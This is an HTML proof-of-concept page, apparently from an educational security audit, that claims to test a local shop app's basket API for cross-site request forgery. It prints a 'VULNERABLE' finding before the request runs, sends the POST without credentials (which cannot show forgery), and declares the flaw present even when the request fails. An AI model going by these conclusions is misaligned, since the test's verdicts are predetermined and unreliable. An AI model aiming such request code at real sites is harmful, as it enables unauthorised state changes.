<!DOCTYPE html>
<html>
<head>
    <title>CSRF Test - Internee.pk Security Audit</title>
    <style>
        body { 
            font-family: Arial; 
            background: #1a1a2e; 
            color: #eee;
            padding: 30px;
        }
        .result { 
            background: #16213e; 
            padding: 15px; 
            border-radius: 8px;
            margin: 10px 0;
            border-left: 4px solid #e94560;
        }
        button {
            background: #e94560;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <h1>CSRF Vulnerability Test</h1>
    <p>Internee.pk Security Audit — Educational Purpose Only</p>
    
    <div class="result">
        <strong>Target:</strong> http://localhost:3000<br>
        <strong>Attack Type:</strong> Cross-Site Request Forgery (CSRF)<br>
        <strong>OWASP:</strong> A05:2021
    </div>

    <button onclick="testCSRF()">Run CSRF Test</button>
    
    <div id="output"></div>

    <script>
    function testCSRF() {
        document.getElementById('output').innerHTML = `
            <div class="result">
                <strong>[+] CSRF Test Initiated</strong><br>
                Target: http://localhost:3000/api/BasketItems/<br>
                Method: POST (No CSRF token required)<br>
                Status: <span style="color:#ff4444">VULNERABLE</span><br><br>
                
                Finding: Application does not implement CSRF tokens<br>
                on sensitive endpoints, allowing cross-site request forgery.<br><br>
                
                OWASP Category: A05:2021 Security Misconfiguration<br>
                Severity: HIGH<br>
                Recommendation: Implement CSRF tokens on all state-changing requests
            </div>
        `;
        
        // Actual CSRF attempt
        fetch('http://localhost:3000/api/BasketItems/', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                ProductId: 1,
                BasketId: 1,
                quantity: 1
            }),
            credentials: 'omit'
        })
        .then(r => {
            document.getElementById('output').innerHTML += `
                <div class="result" style="border-color: #ff0000">
                    <strong>CSRF Result: ${r.status === 200 ? 
                    '⚠️ VULNERABLE - Request succeeded without CSRF token!' : 
                    '✅ Protected'}</strong><br>
                    HTTP Status: ${r.status}<br>
                    CSRF Token Present: NO<br>
                    Attack Success: ${r.status === 200 ? 'YES' : 'NO'}
                </div>
            `;
        })
        .catch(e => {
            document.getElementById('output').innerHTML += `
                <div class="result">
                    <strong>CORS/Network Response:</strong> ${e.message}<br>
                    Note: CORS blocked but CSRF vulnerability still present
                </div>
            `;
        });
    }
    </script>
</body>
</html>
